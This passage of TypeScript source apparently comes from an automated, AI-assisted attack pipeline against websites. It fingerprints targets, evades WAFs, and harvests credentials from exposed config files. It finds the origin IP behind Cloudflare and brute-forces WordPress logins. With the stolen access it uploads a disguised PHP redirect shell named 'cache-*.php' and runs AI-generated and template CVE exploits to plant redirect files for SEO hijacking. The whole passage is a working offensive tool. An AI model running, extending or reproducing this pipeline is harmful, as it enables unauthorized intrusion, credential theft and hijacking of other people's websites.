        config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, ""),
        (step: AnalysisStep) => {
          // Stream each analysis step to frontend
          loggedOnEvent({
            phase: "ai_analysis",
            step: step.stepId,
            detail: `🧠 [${step.stepName}] ${step.detail}`,
            progress: Math.round(step.progress * 0.12), // Scale 0-100 to 0-12 (Phase 0 = 12% of total)
            data: {
              analysisStep: step,
            },
          });
        },
      ),
      new Promise<AiTargetAnalysis>((_, reject) => setTimeout(() => reject(new Error("AI analysis timeout (90s)")), 90000)),
    ]);

    aiDecisions.push(`AI Analysis: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"} server, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"}, DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, Success: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`);

    loggedOnEvent({
      phase: "ai_analysis",
      step: "complete",
      detail: `✅ AI Analysis เสร็จ — Server: ${aiTargetAnalysis.httpFingerprint.serverType || "Unknown"}, CMS: ${aiTargetAnalysis.techStack.cms || "none"}, WAF: ${aiTargetAnalysis.security.wafDetected || "none"} (${aiTargetAnalysis.security.wafStrength}), DA: ${aiTargetAnalysis.seoMetrics.domainAuthority}, โอกาสสำเร็จ: ${aiTargetAnalysis.aiStrategy.overallSuccessProbability}%`,
      progress: 12,
      data: { aiTargetAnalysis },
    });
  } catch (error: any) {
    errors.push(`AI Target Analysis failed: ${error.message}`);
    loggedOnEvent({
      phase: "ai_analysis",
      step: "error",
      detail: `⚠️ AI Analysis ล้มเหลว: ${error.message} — ดำเนินการต่อด้วย pre-screen แบบเดิม`,
      progress: 12,
    });
  }

  loggedOnEvent({
    phase: "prescreen",
    step: "start",
    detail: `🔍 เริ่มวิเคราะห์เป้าหมาย: ${config.targetUrl}`,
    progress: 12,
  });

  // ─── Phase 1: Pre-screening (uses AI analysis data if available) ───
  try {
    loggedOnEvent({
      phase: "prescreen",
      step: "scanning",
      detail: "🔍 Phase 1: Pre-screening — ตรวจสอบเพิ่มเติมจาก AI analysis...",
      progress: 13,
    });

    prescreen = await Promise.race([
      preScreenTarget(config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, "")),
      new Promise<PreScreenResult>((_, reject) => setTimeout(() => reject(new Error("prescreen timeout")), 60000)),
    ]);

    // Merge AI analysis data into prescreen if available
    if (aiTargetAnalysis && prescreen) {
      // Enrich prescreen with AI analysis data
      if (!prescreen.serverType && aiTargetAnalysis.httpFingerprint.serverType) {
        prescreen.serverType = aiTargetAnalysis.httpFingerprint.serverType;
      }
      if (!prescreen.cms && aiTargetAnalysis.techStack.cms) {
        prescreen.cms = aiTargetAnalysis.techStack.cms;
        prescreen.cmsVersion = aiTargetAnalysis.techStack.cmsVersion;
      }
      if (!prescreen.wafDetected && aiTargetAnalysis.security.wafDetected) {
        prescreen.wafDetected = aiTargetAnalysis.security.wafDetected;
        prescreen.wafStrength = aiTargetAnalysis.security.wafStrength;
      }
      if (!prescreen.hostingProvider && aiTargetAnalysis.dnsInfo.hostingProvider) {
        prescreen.hostingProvider = aiTargetAnalysis.dnsInfo.hostingProvider;
      }
      if (!prescreen.ipAddress && aiTargetAnalysis.dnsInfo.ipAddress) {
        prescreen.ipAddress = aiTargetAnalysis.dnsInfo.ipAddress;
      }
      // Use AI strategy probability if it's more informed
      if (aiTargetAnalysis.aiStrategy.overallSuccessProbability > 0) {
        prescreen.overallSuccessProbability = aiTargetAnalysis.aiStrategy.overallSuccessProbability;
      }
    }

    aiDecisions.push(`Pre-screen: ${prescreen.serverType || "Unknown"} server, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, Success probability: ${prescreen.overallSuccessProbability}%`);

    loggedOnEvent({
      phase: "prescreen",
      step: "complete",
      detail: `✅ Pre-screen เสร็จ — Server: ${prescreen.serverType || "Unknown"}, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, โอกาสสำเร็จ: ${prescreen.overallSuccessProbability}%`,
      progress: 18,
      data: { prescreen },
    });

    // Emit world state update after prescreen
    loggedOnEvent({
      phase: "world_update",
      step: "prescreen_done",
      detail: "World state updated from pre-screen",
      progress: 18,
      data: {
        hosts: 1,
        ports: aiTargetAnalysis?.uploadSurface.openPorts.length || 0,
        vulns: aiTargetAnalysis?.vulnerabilities.knownCVEs.length || 0,
        creds: 0,
        uploadPaths: prescreen.writablePaths?.length || 0,
        shellUrls: 0,
        deployedFiles: 0,
        verifiedUrls: 0,
      },
    });
  } catch (error: any) {
    errors.push(`Pre-screen failed: ${error.message}`);
    loggedOnEvent({
      phase: "prescreen",
      step: "error",
      detail: `⚠️ Pre-screen ล้มเหลว: ${error.message} — ดำเนินการต่อด้วยข้อมูลจำกัด`,
      progress: 18,
    });
  }

  // ═══ SMART FALLBACK: Build target profile after prescreen ═══
  try {
    targetProfile = buildTargetProfile(targetDomain, prescreen, aiTargetAnalysis);
    fallbackPlan = generateFallbackPlan(targetProfile, attackLogger, GLOBAL_TIMEOUT / 1000, failedMethods);
    
    loggedOnEvent({
      phase: "smart_fallback",
      step: "plan_generated",
      detail: `🧠 Smart Fallback Plan: ${fallbackPlan.strategy} — ${fallbackPlan.methods.length} methods, ${fallbackPlan.skipMethods.length} skipped`,
      progress: 19,
      data: {
        strategy: fallbackPlan.strategy,
        methodCount: fallbackPlan.methods.length,
        skipCount: fallbackPlan.skipMethods.length,
        topMethods: fallbackPlan.methods.slice(0, 5).map(m => ({
          name: m.method.name,
          successRate: m.estimatedSuccessRate,
          category: m.method.category,
        })),
        shouldSkipUploads: shouldSkipUploads(targetProfile),
        optimalRetries: getOptimalRetryCount(targetProfile),
      },
    });
    
    aiDecisions.push(`Smart Fallback: ${fallbackPlan.strategy}, ${fallbackPlan.methods.length} methods queued`);
  } catch (e: any) {
    console.error("[Smart Fallback] Error:", e.message);
  }

  // ─── Phase 2: Deep Vulnerability Scan ───
  try {
    loggedOnEvent({
      phase: "vuln_scan",
      step: "scanning",
      detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
      progress: 20,
    });

    vulnScan = await Promise.race([
      fullVulnScan(config.targetUrl, (step: string, detail: string, progress: number) => {
        loggedOnEvent({
          phase: "vuln_scan",
          step,
          detail: `🔬 ${detail}`,
          progress: 20 + (progress / 100) * 15,
        });
      }),
      new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), 30000)),
    ]);

    if (vulnScan) {
      const topVectors = vulnScan.attackVectors.slice(0, 3);
      aiDecisions.push(`Deep scan: ${vulnScan.writablePaths.length} writable paths, ${vulnScan.uploadEndpoints.length} upload endpoints, ${vulnScan.attackVectors.length} attack vectors`);
      aiDecisions.push(`Top vectors: ${topVectors.map(v => `${v.name} (${v.successProbability}%)`).join(", ")}`);

      loggedOnEvent({
        phase: "vuln_scan",
        step: "complete",
        detail: `✅ Deep scan เสร็จ — ${vulnScan.writablePaths.length} writable paths, ${vulnScan.attackVectors.length} attack vectors`,
        progress: 35,
        data: { vulnScan },
      });

      // Emit world state update after vuln scan
      loggedOnEvent({
        phase: "world_update",
        step: "vulnscan_done",
        detail: "World state updated from vulnerability scan",
        progress: 35,
        data: {
          hosts: 1,
          ports: 0,
          vulns: vulnScan.misconfigurations?.length || 0,
          creds: 0,
          uploadPaths: vulnScan.writablePaths?.length || 0,
          shellUrls: 0,
          deployedFiles: 0,
          verifiedUrls: 0,
        },
      });
    }
  } catch (error: any) {
    errors.push(`Vuln scan failed: ${error.message}`);
    loggedOnEvent({
      phase: "vuln_scan",
      step: "error",
      detail: `⚠️ Deep scan ล้มเหลว: ${error.message} — ใช้ข้อมูลจาก pre-screen`,
      progress: 35,
    });
  }

  // ─── Phase 2.4: WAF Detection + Auto-Evasion Strategy ───
  let wafDetectionResult: WafDetectionResult | null = null;
  let evasionStrategy: EvasionStrategy | null = null;

  if (!shouldStop('recon')) {
    try {
      loggedOnEvent({
        phase: "recon",
        step: "waf_detection",
        detail: "🛡️ Phase 2.4: WAF Detection — Header fingerprinting, cookie analysis, probe-based detection...",
        progress: 33,
      });

      wafDetectionResult = await Promise.race([
        detectWaf(config.targetUrl),
        new Promise<WafDetectionResult>((_, reject) => setTimeout(() => reject(new Error("WAF detection timeout")), 60000)),
      ]);

      if (wafDetectionResult.detected) {
        evasionStrategy = getEvasionStrategy(wafDetectionResult);
        aiDecisions.push(`🛡️ WAF Detected: ${wafDetectionResult.wafName} (${wafDetectionResult.confidence} confidence, ${wafDetectionResult.strength} strength)`);
        aiDecisions.push(`🛡️ Static Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}`);

        // ═══ ENHANCED: Query learned WAF bypass strategies from historical data ═══
        try {
          const wafName = wafDetectionResult.wafName || "unknown";
          const bypassData = await selectBypassTechniques(wafName, { maxTechniques: 5 });
          if (bypassData.techniques.length > 0) {
            // Merge learned techniques into evasion strategy (learned first, then static)
            const learnedTechniques = bypassData.techniques.map(t => t.name);
            evasionStrategy.primaryTechniques = [
              ...learnedTechniques,
              ...evasionStrategy.primaryTechniques.filter(t => !learnedTechniques.includes(t)),
            ];
            aiDecisions.push(`🧠 WAF Bypass Intelligence: ${bypassData.reasoning}`);
            aiDecisions.push(`🧠 Learned bypass techniques (${bypassData.techniques.length}): ${learnedTechniques.join(", ")}`);
            if (bypassData.profile.overallBypassRate !== null) {
              aiDecisions.push(`📊 Historical bypass rate for ${wafName}: ${bypassData.profile.overallBypassRate.toFixed(1)}%`);
            }
            if (bypassData.profile.knownWeaknesses.length > 0) {
              aiDecisions.push(`🎯 Known weaknesses: ${bypassData.profile.knownWeaknesses.slice(0, 3).join(", ")}`);
            }
          }
        } catch (bypassErr: any) {
          aiDecisions.push(`⚠️ WAF bypass intelligence lookup failed: ${bypassErr.message}`);
        }

        // Track WAF detection in database
        trackWafDetection({
          targetDomain: extractDomain(config.targetUrl),
          targetUrl: config.targetUrl,
          wafName: wafDetectionResult.wafName || null,
          wafVendor: wafDetectionResult.wafVendor || null,
          confidence: wafDetectionResult.confidence || null,
          strength: wafDetectionResult.strength || null,
          blocksXss: wafDetectionResult.blockBehavior?.blocksXss || false,
          blocksSqli: wafDetectionResult.blockBehavior?.blocksSqli || false,
          blocksFileUpload: wafDetectionResult.blockBehavior?.blocksFileUpload || false,
          blocksPathTraversal: wafDetectionResult.blockBehavior?.blocksPathTraversal || false,
          blocksCommandInjection: wafDetectionResult.blockBehavior?.blocksCommandInjection || false,
          blocksRateLimit: wafDetectionResult.blockBehavior?.blockRateLimit || false,
          detectionMethods: wafDetectionResult.detectionMethods || [],
          evasionRecommendations: evasionStrategy.primaryTechniques || [],
          pipelineRunId: null,
        }).catch(() => {});

        loggedOnEvent({
          phase: "recon",
          step: "waf_detected",
          detail: `🛡️ WAF Detected: ${wafDetectionResult.wafName} (${wafDetectionResult.wafVendor}) — Confidence: ${wafDetectionResult.confidence}, Strength: ${wafDetectionResult.strength}. Blocks: XSS=${wafDetectionResult.blockBehavior.blocksXss}, SQLi=${wafDetectionResult.blockBehavior.blocksSqli}, Upload=${wafDetectionResult.blockBehavior.blocksFileUpload}. Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}`,
          progress: 34,
        });
      } else {
        aiDecisions.push("🛡️ No WAF detected — proceeding with standard attack methods");
        loggedOnEvent({
          phase: "recon",
          step: "no_waf",
          detail: "🛡️ No WAF detected — standard attack methods will be used",
          progress: 34,
        });
      }
    } catch (err: any) {
      aiDecisions.push(`🛡️ WAF detection failed: ${err.message} — proceeding without evasion`);
      loggedOnEvent({
        phase: "recon",
        step: "waf_error",
        detail: `🛡️ WAF detection error: ${err.message}`,
        progress: 34,
      });
    }
  }

  // ─── Phase 2.5: Recon — Config Exploitation + DNS/Origin IP Discovery ───
  let configResults: ConfigExploitResult[] = [];
  let dnsResults: DnsAttackResult[] = [];
  let originIp: string | undefined;
  let discoveredCredentials: any[] = [];
  let nonWpExploitResults: NonWpScanResult | null = null;

  if (config.enableConfigExploit !== false && !shouldStop('config_exploit')) {
    try {
      loggedOnEvent({
        phase: "config_exploit",
        step: "scanning",
        detail: "🔓 Phase 2.5a: Config Exploitation — ค้นหา backup files, .env, phpinfo, credentials...",
        progress: 36,
      });

      configResults = await Promise.race([
        runConfigExploits({
          targetUrl: config.targetUrl,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            loggedOnEvent({
              phase: "config_exploit",
              step: vector,
              detail: `🔓 ${detail}`,
              progress: 37,
            });
          },
        }),
        new Promise<ConfigExploitResult[]>((_, reject) => setTimeout(() => reject(new Error("config exploit timeout")), 20000)),
      ]);

      const successExploits = configResults.filter(r => r.success);
      discoveredCredentials = configResults.filter(r => r.credentials).flatMap(r => r.credentials ? [r.credentials] : []);

      if (successExploits.length > 0) {
        aiDecisions.push(`Config exploit: ${successExploits.length} findings — ${successExploits.map(r => r.vector).join(", ")}`);
      }
      if (discoveredCredentials.length > 0) {
        aiDecisions.push(`🔑 Discovered ${discoveredCredentials.length} credentials — will use for authenticated uploads`);
      }

      loggedOnEvent({
        phase: "config_exploit",
        step: "complete",
        detail: `✅ Config exploit เสร็จ — ${successExploits.length} findings, ${discoveredCredentials.length} credentials`,
        progress: 38,
        data: { configResults, discoveredCredentials },
      });
    } catch (error: any) {
      errors.push(`Config exploit failed: ${error.message}`);
    }
  }

  if (config.enableDnsAttacks !== false && !shouldStop('dns_recon')) {
    try {
      loggedOnEvent({
        phase: "dns_attack",
        step: "scanning",
        detail: "🌐 Phase 2.5b: DNS Recon — Origin IP discovery, subdomain takeover, DNS rebinding...",
        progress: 38,
      });

      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      dnsResults = await Promise.race([
        runDnsAttacks({
          targetDomain,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            loggedOnEvent({
              phase: "dns_attack",
              step: vector,
              detail: `🌐 ${detail}`,
              progress: 39,
            });
          },
        }),
        new Promise<DnsAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("dns attacks timeout")), 25000)),
      ]);

      const successDns = dnsResults.filter(r => r.success);
      const originResult = dnsResults.find(r => r.vector === "origin_ip_discovery" && r.success && r.data?.originIp);
      if (originResult) {
        originIp = originResult.data!.originIp;
        aiDecisions.push(`🎯 Origin IP discovered: ${originIp} — will bypass WAF by targeting directly`);
      }
      const takeoverResult = dnsResults.find(r => r.vector === "subdomain_takeover" && r.success);
      if (takeoverResult) {
        aiDecisions.push(`🎯 Subdomain takeover possible: ${takeoverResult.data?.vulnerableSubdomains?.map(s => s.subdomain).join(", ") || "unknown"}`);
      }

      loggedOnEvent({
        phase: "dns_attack",
        step: "complete",
        detail: `✅ DNS recon เสร็จ — ${successDns.length} findings${originIp ? `, Origin IP: ${originIp}` : ""}`,
        progress: 40,
        data: { dnsResults, originIp },
      });
    } catch (error: any) {
      errors.push(`DNS attacks failed: ${error.message}`);
    }
  }

  // ─── Phase 2.5c: Cloudflare Origin IP Bypass (Advanced) ───
  let cfBypassResult: OriginIPResult | null = null;
  const wafDetected = prescreen?.wafDetected || aiTargetAnalysis?.security?.wafDetected || vulnScan?.serverInfo?.waf || vulnScan?.serverInfo?.cdn || "";
  const isCloudflare = wafDetected.toLowerCase().includes("cloudflare");
  
  if (isCloudflare && !shouldStop('cf_bypass')) {
    try {
      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      loggedOnEvent({
        phase: "cf_bypass",
        step: "scanning",
        detail: "☁️ Phase 2.5c: Cloudflare Origin IP Bypass — Shodan SSL, DNS History, MX/SPF, Subdomain Enum...",
        progress: 41,
      });

      cfBypassResult = await Promise.race([
        findOriginIP(targetDomain, (msg) => {
          loggedOnEvent({
            phase: "cf_bypass",
            step: "scanning",
            detail: `☁️ ${msg}`,
            progress: 42,
          });
        }),
        new Promise<OriginIPResult>((_, reject) => setTimeout(() => reject(new Error("CF bypass timeout")), 90000)),
      ]);

      if (cfBypassResult.found && cfBypassResult.originIP) {
        originIp = cfBypassResult.originIP;
        aiDecisions.push(`☁️ CF Bypass สำเร็จ! Origin IP: ${originIp} (confidence: ${cfBypassResult.confidence}%, source: ${cfBypassResult.method}, verified: ${cfBypassResult.verified})`);
      } else if (cfBypassResult.allCandidates.length > 0) {
        // Use best unverified candidate
        const bestCandidate = cfBypassResult.allCandidates.sort((a, b) => b.confidence - a.confidence)[0];
        originIp = bestCandidate.ip;
        aiDecisions.push(`☁️ CF Bypass: Origin IP candidate ${originIp} (unverified, confidence: ${bestCandidate.confidence}%, source: ${bestCandidate.source})`);
      }

      loggedOnEvent({
        phase: "cf_bypass",
        step: "complete",
        detail: `✅ CF Bypass เสร็จ — ${cfBypassResult.allCandidates.length} candidates, verified: ${cfBypassResult.verified}${originIp ? `, Origin IP: ${originIp}` : ""}`,
        progress: 43,
        data: { cfBypassResult, originIp },
      });
    } catch (error: any) {
      errors.push(`CF bypass failed: ${error.message}`);
      loggedOnEvent({
        phase: "cf_bypass",
        step: "error",
        detail: `⚠️ CF Bypass ล้มเหลว: ${error.message}`,
        progress: 43,
      });
    }
  }

  // ─── Phase 2.5d: WP Brute Force (if WordPress detected) ───
  let wpBruteForceResult: BruteForceResult | null = null;
  let wpAuthCredentials: WPCredentials | null = null;
  const detectedCms = (prescreen?.cms || aiTargetAnalysis?.techStack?.cms || vulnScan?.cms?.type || "").toLowerCase();
  const isWordPress = detectedCms.includes("wordpress") || detectedCms === "wp";

  if (isWordPress && !shouldStop('wp_brute_force') && !hasSuccessfulRedirect()) {
    try {
      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      loggedOnEvent({
        phase: "wp_brute_force",
        step: "scanning",
        detail: "🔑 Phase 2.5d: WP Brute Force — Username enum + XMLRPC/wp-login credential testing...",
        progress: 44,
      });

      // Calculate remaining time for brute force (max 2 min or remaining pipeline time, whichever is less)
      const remainingMs = Math.max(deadline - Date.now(), 30000);
      const bruteForceTimeout = Math.min(120000, remainingMs);

      wpBruteForceResult = await Promise.race([
        wpBruteForce({
          targetUrl: config.targetUrl,
          domain: targetDomain,
          maxAttempts: 50,
          delayBetweenAttempts: 800,
          maxLockouts: 3,           // Stop after 3 lockouts (was infinite!)
          globalTimeout: bruteForceTimeout, // Respect pipeline deadline
          originIP: originIp,
          onProgress: (msg) => {
            loggedOnEvent({
              phase: "wp_brute_force",
              step: "testing",
              detail: `🔑 ${msg}`,
              progress: 45,
            });
          },
        }),
        new Promise<BruteForceResult>((_, reject) => setTimeout(() => reject(new Error("brute force timeout")), bruteForceTimeout + 5000)),
      ]);

      if (wpBruteForceResult.success && wpBruteForceResult.credentials) {
        wpAuthCredentials = wpBruteForceResult.credentials;
        aiDecisions.push(`🔑 WP Brute Force สำเร็จ! User: ${wpAuthCredentials.username} via ${wpAuthCredentials.method} (${wpBruteForceResult.attemptsMade} attempts)`);
        
        // Immediately try authenticated upload with quick redirect shell
        {
          const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
          loggedOnEvent({
            phase: "wp_brute_force",
            step: "uploading",
            detail: "🔑 ลอง authenticated upload ด้วย credentials ที่ได้...",
            progress: 46,
          });

          const uploadResult = await wpAuthenticatedUpload(
            config.targetUrl,
            targetDomain,
            wpAuthCredentials,
            `cache-${Math.random().toString(36).slice(2, 10)}.php`,
            quickShell,
            "application/x-php",
            originIp,
            (msg) => {
              loggedOnEvent({
                phase: "wp_brute_force",
                step: "uploading",
                detail: `🔑 ${msg}`,
                progress: 47,
              });
            }
          );

          if (uploadResult.success && uploadResult.url) {
            aiDecisions.push(`🎯 Authenticated upload สำเร็จ: ${uploadResult.url}`);
            // Verify the upload
            const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);
            const uploadedFile: UploadedFile = {
              url: uploadResult.url,
              shell: { type: "redirect_php", content: quickShell, filename: "cache.php", contentType: "application/x-php", description: "Quick redirect via brute force auth", id: `bf_${Date.now()}`, targetVector: "wp_brute_force", bypassTechniques: ["auth_login"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
              method: `wp_brute_force_${wpAuthCredentials.method}`,
              verified: verification.verified,
              redirectWorks: verification.redirectWorks,
              redirectDestinationMatch: verification.redirectDestinationMatch,
              finalDestination: verification.finalDestination,
              httpStatus: verification.httpStatus,
              redirectChain: verification.redirectChain,
            };
            if (verification.verified) uploadedFiles.push(uploadedFile);
          }
        }
      } else {
        aiDecisions.push(`🔑 WP Brute Force: ${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users found, no valid credentials`);
      }

      loggedOnEvent({
        phase: "wp_brute_force",
        step: "complete",
        detail: `✅ WP Brute Force เสร็จ — ${wpBruteForceResult.success ? "สำเร็จ!" : "ไม่พบ credentials"} (${wpBruteForceResult.attemptsMade} attempts, ${wpBruteForceResult.usernamesFound.length} users)`,
        progress: 48,
        data: { wpBruteForceResult, wpAuthCredentials: wpAuthCredentials ? { username: wpAuthCredentials.username, method: wpAuthCredentials.method } : null },
      });
    } catch (error: any) {
      errors.push(`WP brute force failed: ${error.message}`);
      loggedOnEvent({
        phase: "wp_brute_force",
        step: "error",
        detail: `⚠️ WP Brute Force ล้มเหลว: ${error.message}`,
        progress: 48,
      });
    }
  }

  // ─── Phase 2.6: WP Vulnerability Scan (WPScan-style) + Exploit Execution ───
  let wpVulnScanResult: WpScanResult | null = null;
  let aiExploitResults: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> = [];

  if (!shouldStop('wp_vuln_scan') && !hasSuccessfulRedirect()) {
    loggedOnEvent({
      phase: "wp_vuln_scan" as any,
      step: "start",
      detail: `🔍 Phase 2.6: WP Vuln Scan — Plugin/Theme enumeration + CVE matching (WPScan-style)...`,
      progress: 49,
    });

    try {
      wpVulnScanResult = await Promise.race([
        runWpVulnScan(config.targetUrl, (phase, detail, progress) => {
          loggedOnEvent({
            phase: "wp_vuln_scan" as any,
            step: phase,
            detail: `🔍 ${detail}`,
            progress: 49 + Math.round(progress * 0.06),
          });
        }),
        new Promise<WpScanResult>((_, reject) => setTimeout(() => reject(new Error("WP Vuln Scan timeout")), 120000)),
      ]);

      if (wpVulnScanResult.isWordPress) {
        const exploitableVulns = wpVulnScanResult.vulnerabilities.filter(v => v.exploitAvailable);
        aiDecisions.push(`🔍 WP Vuln Scan: ${wpVulnScanResult.plugins.length} plugins, ${wpVulnScanResult.vulnerabilities.length} vulns (${exploitableVulns.length} exploitable)`);

        loggedOnEvent({
          phase: "wp_vuln_scan" as any,
          step: "results",
          detail: `🔍 WP Vuln Scan: ${wpVulnScanResult.plugins.length} plugins found, ${wpVulnScanResult.vulnerabilities.length} potential vulnerabilities, ${exploitableVulns.length} with exploits, ${wpVulnScanResult.users.length} users, ${wpVulnScanResult.interestingFindings.length} findings`,
          progress: 53,
          data: {
            plugins: wpVulnScanResult.plugins.map(p => `${p.slug}${p.version ? ` v${p.version}` : ''}`),
            vulns: wpVulnScanResult.vulnerabilities.map(v => `${v.plugin}: ${v.title} (${v.severity})`),
            users: wpVulnScanResult.users,
            findings: wpVulnScanResult.interestingFindings,
          },
        });

        // Execute exploits for file_upload and rce vulnerabilities
        // Strategy: AI Exploit Generator first → fallback to template-based exploits
        if (exploitableVulns.length > 0 && !hasSuccessfulRedirect()) {
          loggedOnEvent({
            phase: "wp_vuln_scan" as any,
            step: "exploiting",
            detail: `💥 Executing ${exploitableVulns.length} exploits with AI Exploit Generator (${exploitableVulns.map(v => v.cve || v.title).join(', ')})...`,
            progress: 54,
          });

          const redirectShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;

          for (const vuln of exploitableVulns) {
            if (hasSuccessfulRedirect()) break;
            try {
              // === AI EXPLOIT GENERATOR (primary) ===
              let aiExploitSuccess = false;
              try {
                loggedOnEvent({
                  phase: "wp_vuln_scan" as any,
                  step: "ai_exploit",
                  detail: `🤖 AI Exploit Generator: Generating custom payload for ${vuln.cve || vuln.title}...`,
                  progress: 54,
                });

                const aiResult = await Promise.race([
                  generateAndExecuteExploit(
                    config.targetUrl,
                    vuln.cve || null,
                    "wordpress",
                    vuln.plugin,
                    vuln.type,
                    vuln.title,
                    config.redirectUrl,
                  ),
                  new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
                    setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
                  ),
                ]);

                aiExploitResults.push({
                  cveId: vuln.cve || null,
                  cms: "wordpress",
                  component: vuln.plugin,
                  vulnType: vuln.type,
                  exploitType: aiResult.payload.exploitType,
                  success: aiResult.success,
                  uploadedUrl: aiResult.uploadedUrl,
                });

                if (aiResult.success && aiResult.uploadedUrl) {
                  aiExploitSuccess = true;
                  aiDecisions.push(`🤖 AI Exploit SUCCESS: ${vuln.cve || vuln.title} → ${aiResult.uploadedUrl} (type: ${aiResult.payload.exploitType})`);

                  const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
                  uploadedFiles.push({
                    url: aiResult.uploadedUrl,
                    shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || redirectShell, filename: aiResult.payload.uploadFilename || "ai-exploit.php", contentType: "application/x-php", description: `AI: ${vuln.cve || vuln.title}`, id: `ai_cve_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated", aiResult.payload.exploitType], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
                    method: `ai_exploit_${vuln.plugin}`,
                    verified: verification.verified,
                    redirectWorks: verification.redirectWorks,
                    redirectDestinationMatch: verification.redirectDestinationMatch,
                    finalDestination: verification.finalDestination,
                    httpStatus: verification.httpStatus,
                    redirectChain: verification.redirectChain,
                  });

                  loggedOnEvent({
                    phase: "wp_vuln_scan" as any,
                    step: "ai_exploit_success",
                    detail: `✅ AI Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${aiResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
                    progress: 55,
                    data: { vuln, aiResult: { success: true, url: aiResult.uploadedUrl, type: aiResult.payload.exploitType }, verification },
                  });
                } else {
                  loggedOnEvent({
                    phase: "wp_vuln_scan" as any,
                    step: "ai_exploit_failed",
                    detail: `⚠️ AI Exploit failed for ${vuln.cve || vuln.title}, falling back to template exploit...`,
                    progress: 54,
                  });
                }
              } catch (aiErr: any) {
                loggedOnEvent({
                  phase: "wp_vuln_scan" as any,
                  step: "ai_exploit_error",
                  detail: `⚠️ AI Exploit error (${vuln.plugin}): ${aiErr.message}, falling back...`,
                  progress: 54,
                });
              }

              // === TEMPLATE EXPLOIT (fallback) ===
              if (!aiExploitSuccess && !hasSuccessfulRedirect()) {
                const exploitResult = await executeExploit(
                  config.targetUrl,
                  vuln,
                  `cache-${Math.random().toString(36).slice(2, 8)}.php`,
                  redirectShell,
                );

                if (exploitResult.success && exploitResult.uploadedUrl) {
                  aiDecisions.push(`💥 Template Exploit SUCCESS: ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl}`);

                  const verification = await verifyUploadedFile(exploitResult.uploadedUrl, config.redirectUrl, onEvent);
                  uploadedFiles.push({
                    url: exploitResult.uploadedUrl,
                    shell: { type: "redirect_php", content: redirectShell, filename: "cve-exploit.php", contentType: "application/x-php", description: `${vuln.cve || vuln.title}`, id: `cve_${Date.now()}`, targetVector: "wp_vuln_scan", bypassTechniques: ["cve_exploit"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
                    method: `cve_exploit_${vuln.plugin}`,
                    verified: verification.verified,
                    redirectWorks: verification.redirectWorks,
                    redirectDestinationMatch: verification.redirectDestinationMatch,
                    finalDestination: verification.finalDestination,
                    httpStatus: verification.httpStatus,
                    redirectChain: verification.redirectChain,
                  });

                  loggedOnEvent({
                    phase: "wp_vuln_scan" as any,
                    step: "exploit_success",
                    detail: `✅ Template Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
                    progress: 55,
                    data: { vuln, exploitResult, verification },
                  });
                } else {
                  loggedOnEvent({
                    phase: "wp_vuln_scan" as any,
                    step: "exploit_failed",
                    detail: `⚠️ ${vuln.cve || vuln.title}: ${exploitResult.details}`,
                    progress: 54,
                  });
                }
              }
            } catch (exploitErr: any) {
              loggedOnEvent({
                phase: "wp_vuln_scan" as any,
                step: "exploit_error",
                detail: `⚠️ Exploit error (${vuln.plugin}): ${exploitErr.message}`,
                progress: 54,
              });
            }
          }
        }

        // If WP users were found but brute force wasn't run, add them to discoveredCredentials
        if (wpVulnScanResult.users.length > 0 && !wpBruteForceResult) {
          for (const user of wpVulnScanResult.users) {
            discoveredCredentials.push({ type: 'wp_user', username: user });
          }
        }
      } else {
        aiDecisions.push(`🔍 WP Vuln Scan: Target is not WordPress — skipped`);
        loggedOnEvent({
          phase: "wp_vuln_scan" as any,
          step: "not_wp",
          detail: `ℹ️ Target is not WordPress — WP Vuln Scan skipped`,
          progress: 55,
        });
      }
    } catch (error: any) {
      errors.push(`WP Vuln Scan error: ${error.message}`);
      loggedOnEvent({
        phase: "wp_vuln_scan" as any,
        step: "error",
        detail: `⚠️ WP Vuln Scan error: ${error.message}`,
        progress: 55,
      });
    }
  }

  // ─── Phase 2.7: Multi-CMS Vulnerability Scan (Joomla, Drupal, Magento, etc.) ───
  let cmsScanResult: CmsScanResult | null = null;
